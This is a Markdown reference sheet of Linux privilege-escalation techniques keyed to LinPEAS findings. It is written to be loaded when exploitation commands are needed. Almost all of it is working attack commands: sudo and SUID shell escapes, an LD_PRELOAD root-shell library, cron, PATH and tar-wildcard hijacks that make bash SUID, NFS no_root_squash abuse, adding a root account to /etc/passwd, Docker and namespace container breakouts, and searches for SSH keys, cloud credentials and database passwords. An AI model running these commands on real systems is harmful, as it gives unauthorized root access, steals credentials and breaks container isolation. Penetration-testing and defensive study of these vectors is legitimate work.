# Linux Privilege Escalation Vectors

Detailed exploitation steps for common Linux privilege escalation vectors found by LinPEAS.
Load this reference when you need exploitation commands for a specific vector.

## Table of Contents
- [1. Sudo Misconfigurations](#1-sudo-misconfigurations)
- [2. SUID/SGID Binaries](#2-suidsgid-binaries)
- [3. Linux Capabilities](#3-linux-capabilities)
- [4. Cron Job Exploitation](#4-cron-job-exploitation)
- [5. PATH Hijacking](#5-path-hijacking)
- [6. NFS No_Root_Squash](#6-nfs-no_root_squash)
- [7. Writable /etc/passwd](#7-writable-etcpasswd)
- [8. Container Breakout](#8-container-breakout)
- [9. Credential Files](#9-credential-files)
- [10. Service File Exploitation](#10-service-file-exploitation)

---

## 1. Sudo Misconfigurations

### NOPASSWD Entries
```bash
# Check
sudo -l

# If output includes: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# If (ALL) NOPASSWD: ALL
sudo /bin/bash
```

### Sudo with Wildcard (`*`)
```bash
# Vulnerable: (root) NOPASSWD: /usr/bin/rsync *
sudo rsync -e 'sh -p' . /dev/null
```

### LD_PRELOAD via sudo
```bash
# If env_keep includes LD_PRELOAD in sudoers
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any-allowed-command>
```

---

## 2. SUID/SGID Binaries

### Discovery
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### Common Exploitable SUID Binaries (GTFOBins)

| Binary    | Exploit Command |
|-----------|-----------------|
| `find`    | `find . -exec /bin/bash -p \; -quit` |
| `bash`    | `/bin/bash -p` |
| `vim`     | `vim -c ':py import os; os.execl("/bin/sh","sh","-p")'` |
| `python`  | `python -c 'import os; os.execl("/bin/bash","bash","-p")'` |
| `nmap`    | `nmap --interactive` then `!sh` |
| `cp`      | Copy `/etc/passwd` with modified root entry |
| `env`     | `env /bin/bash -p` |
| `less`    | `less /etc/passwd` then `!/bin/bash` |
| `more`    | `more /etc/passwd` then `!/bin/bash` |
| `man`     | `man man` then `!/bin/bash` |
| `awk`     | `awk 'BEGIN {system("/bin/bash -p")}'` |
| `perl`    | `perl -e 'exec "/bin/bash";'` |
| `wget`    | Overwrite sensitive file with wget -O |

---

## 3. Linux Capabilities

### Discovery
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

### Dangerous Capabilities

| Capability | Binary | Exploit |
|------------|--------|---------|
| `cap_setuid` | python3 | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_net_raw` | tcpdump | Packet capture (credential sniffing) |
| `cap_dac_read_search` | tar | Read any file: `tar czf /tmp/shadow.tar /etc/shadow` |
| `cap_sys_admin` | — | Mount filesystems, namespace manipulation |
| `cap_sys_ptrace` | — | Inject into running processes |

---

## 4. Cron Job Exploitation

### Discovery
```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/
crontab -l 2>/dev/null
```

### Writable Script in Cron
```bash
# If cron runs /opt/backup.sh as root and it's world-writable:
echo "chmod +s /bin/bash" >> /opt/backup.sh
# Wait for cron execution, then:
/bin/bash -p
```

### PATH Hijacking via Cron
```bash
# If cron uses relative PATH and /tmp is writable:
# Crontab: */5 * * * * root cleanup
echo '#!/bin/bash' > /tmp/cleanup
echo 'chmod +s /bin/bash' >> /tmp/cleanup
chmod +x /tmp/cleanup
export PATH=/tmp:$PATH
```

### Wildcard Injection
```bash
# Cron: tar czf /backup/$(date).tar /var/www/*
cd /var/www
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
echo '#!/bin/bash\nchmod +s /bin/bash' > payload.sh
chmod +x payload.sh
```

---

## 5. PATH Hijacking

```bash
# Check writable directories in PATH
echo $PATH | tr ':' '\n' | while read dir; do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# If /usr/local/bin is writable and a root-run script calls 'python' without full path:
echo '#!/bin/bash' > /usr/local/bin/python
echo 'chmod +s /bin/bash' >> /usr/local/bin/python
chmod +x /usr/local/bin/python
```

---

## 6. NFS No_Root_Squash

```bash
# Check NFS exports
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# On attacker machine (as root):
mount -o rw,vers=2 <target-ip>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target:
/mnt/nfs/bash -p
```

---

## 7. Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt salt hacked
# Output: $1$salt$hash

# Append new root user
echo 'hacker:$1$salt$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker  # password: hacked
```

---

## 8. Container Breakout

### Privileged Container Detection
```bash
# Check effective capabilities (full set = privileged)
cat /proc/self/status | grep CapEff
# 0000003fffffffff = fully privileged

# Mount host filesystem from privileged container
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # adjust device
chroot /mnt/host /bin/bash
```

### Docker Socket Abuse
```bash
# If /var/run/docker.sock is accessible:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Exposed Host /proc/sched_debug
```bash
# Container namespace escape via nsenter (if nsenter is available)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

---

## 9. Credential Files

```bash
# SSH private keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Git credentials
find / -name ".git-credentials" -o -name ".netrc" 2>/dev/null

# AWS/cloud credentials
find / -name "credentials" -path "*/.aws/*" 2>/dev/null
find / -name "*.json" | xargs grep -l "private_key" 2>/dev/null

# Database connection strings
grep -r "DB_PASS\|DATABASE_URL\|MYSQL_ROOT_PASSWORD" /etc /opt /var/www 2>/dev/null
```

---

## 10. Service File Exploitation

```bash
# Find writable systemd service files
find /etc/systemd/system /lib/systemd/system -writable -name "*.service" 2>/dev/null

# Modify ExecStart to add SUID bash
# [Service]
# ExecStart=/bin/bash -c 'chmod +s /bin/bash'
# Type=oneshot

systemctl daemon-reload
systemctl restart <vulnerable-service>
/bin/bash -p
```
